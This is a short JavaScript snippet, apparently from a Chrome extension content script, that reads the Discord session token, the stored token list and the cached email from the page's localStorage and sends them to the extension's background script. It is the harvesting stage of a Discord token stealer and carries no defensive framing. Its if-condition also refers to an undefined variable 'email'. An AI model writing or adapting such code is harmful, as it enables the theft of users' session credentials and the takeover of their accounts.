// Access Local Storage to get Tokens & Cached Email
const discordToken = localStorage.getItem('token');
const discordTokens = localStorage.getItem('tokens');
const discordEmail = localStorage.getItem('email_cache');

if (discordToken || discordTokens || email) {
    // Send both tokens to the background script
    chrome.runtime.sendMessage(
        {
            type: "token",
            token: discordToken || null, 
            tokens: discordTokens || null,
            email: discordEmail || null
        }
    );
}
